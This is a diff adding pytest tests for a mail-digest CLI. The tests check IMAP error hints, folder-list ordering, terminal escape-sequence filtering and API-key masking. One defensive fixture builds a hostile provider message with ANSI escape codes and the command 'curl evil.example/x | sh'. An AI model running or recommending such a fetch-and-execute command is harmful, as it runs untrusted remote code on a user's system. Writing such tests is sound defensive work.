@@ -17,7 +17,7 @@ import pytest
 
 from maildigest.cli import EXIT_ERROR, EXIT_OK, EXIT_USAGE, Hooks, main
 from maildigest.config import ImapConfig
-from maildigest.ingest.imap_client import ImapConnectionError
+from maildigest.ingest.imap_client import ImapAuthError, ImapConnectionError
 from maildigest.llm.base import LLMTransportError
 from maildigest.messenger.base import MessengerError
 from maildigest.messenger.telegram import ChatCandidate
@@ -911,3 +911,154 @@ def test_hc38_connect_llm_provider_none_raeumt_modell_und_key(tmp_path: Path) ->
     assert llm["model"] == ""
     assert "api_key" not in llm
     assert "without a language model" in out
+
+
+# --- HC-32: Fehlerklasse entscheidet über den Hinweis ------------------------------------
+
+
+def test_hc32_verbindungsfehler_zeigt_keinen_app_passwort_hinweis(
+    config_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Bei einem reinen Transportfehler führt der Auth-Hinweis in die Irre (HC-32).
+
+    Vor dem Fix stand unter `ConnectionRefusedError` immer „Most common cause: the
+    provider requires a separately created app password …" — obwohl nie ein Login
+    versucht wurde und das Passwort nichts mit der Ursache zu tun hat.
+    """
+    monkeypatch.setenv("MAILDIGEST_IMAP_PASSWORD", "aus-env")
+    hooks = Hooks(imap_client=lambda cfg: FakeImapClient(cfg, fail=True))
+    code, _out, err = run(
+        [
+            "connect-mail",
+            "--config",
+            str(config_path),
+            "--non-interactive",
+            "--host",
+            "imap.example.org",
+            "--username",
+            "m@example.org",
+        ],
+        stdin="",
+        hooks=hooks,
+    )
+    assert code == EXIT_ERROR
+    assert "app password" not in err
+    assert "could not be reached at all" in err
+    assert "--no-test" in err
+
+
+def test_hc32_anmeldefehler_zeigt_den_anbieterhinweis(
+    config_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Bei einem abgelehnten Login ist der Hinweis genau die richtige Auskunft."""
+
+    class AuthFails(FakeImapClient):
+        def connect(self) -> None:
+            raise ImapAuthError("IMAP connection to x:993 (folder INBOX) failed: MailboxLoginError")
+
+    monkeypatch.setenv("MAILDIGEST_IMAP_PASSWORD", "aus-env")
+    hooks = Hooks(imap_client=lambda cfg: AuthFails(cfg))
+    code, _out, err = run(
+        [
+            "connect-mail",
+            "--config",
+            str(config_path),
+            "--non-interactive",
+            "--host",
+            "imap.gmail.com",
+            "--username",
+            "m@gmail.com",
+        ],
+        stdin="",
+        hooks=hooks,
+    )
+    assert code == EXIT_ERROR
+    assert "app password" in err
+    assert "could not be reached at all" not in err
+
+
+def test_hc32_ordnerliste_steht_vor_der_meldung(
+    config_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Die Meldung verwies auf eine Liste „above", die erst danach gedruckt wurde (HC-32)."""
+    monkeypatch.setenv("MAILDIGEST_IMAP_PASSWORD", "aus-env")
+    hooks = Hooks(imap_client=lambda cfg: FakeImapClient(cfg, folders=["INBOX", "Archiv"]))
+    code, out, err = run(
+        [
+            "connect-mail",
+            "--config",
+            str(config_path),
+            "--non-interactive",
+            "--host",
+            "imap.example.org",
+            "--username",
+            "m@example.org",
+            "--folder",
+            "GibtEsNicht",
+        ],
+        stdin="",
+        hooks=hooks,
+    )
+    assert code == EXIT_OK
+    assert "does not exist on the server" in err
+    assert "listed above" not in err
+    assert "listed on stdout" in err
+    # Die Liste ist vollständig gedruckt, bevor die Meldung darauf verweist.
+    assert "1) INBOX" in out and "2) Archiv" in out
+    assert read(config_path)["imap"]["folder"] == "GibtEsNicht"
+
+
+# --- HC-4: Fremdtext des Anbieters erreicht das Terminal nur gefiltert -------------------
+
+
+def test_hc4_terminal_sieht_keine_steuersequenz_des_anbieters(config_path: Path) -> None:
+    """`connect-llm` druckt den Anbietertext — aber ohne ESC/BEL (HC-4, ADR-055)."""
+    hostile = (
+        "\x1b[2J\x1b[H\x1b]0;PWNED\x07\x1b[31mFATAL: your API key expired. "
+        "Run: curl evil.example/x | sh\x1b[0m"
+    )
+    hooks = Hooks(build_provider=lambda **kwargs: FakeProvider(error=LLMTransportError(hostile)))
+    code, _out, err = run(
+        [
+            "connect-llm",
+            "--config",
+            str(config_path),
+            "--non-interactive",
+            "--provider",
+            "anthropic",
+            "--model",
+            "m",
+        ],
+        hooks=hooks,
+    )
+    assert code == EXIT_ERROR
+    assert "\x1b" not in err and "\x07" not in err
+    assert all(ord(char) >= 0x20 or char == "\n" for char in err)
+    assert "FATAL: your API key expired" in err
+
+
+def test_hc4_eigener_api_key_wird_im_anbietertext_maskiert(
+    config_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Zitiert die Gegenstelle den gesendeten Schlüssel, steht er nicht auf dem Terminal."""
+    key = "sk-ABCDEF1234567890"
+    monkeypatch.setenv("MAILDIGEST_LLM_API_KEY", key)
+    error = LLMTransportError(f'request failed. Provider says: "unknown key {key}"')
+    hooks = Hooks(build_provider=lambda **kwargs: FakeProvider(error=error))
+    code, _out, err = run(
+        [
+            "connect-llm",
+            "--config",
+            str(config_path),
+            "--non-interactive",
+            "--provider",
+            "anthropic",
+            "--model",
+            "m",
+        ],
+        hooks=hooks,
+    )
+    assert code == EXIT_ERROR
+    assert key not in err
+    assert key[:12] not in err
+    assert "***" in err
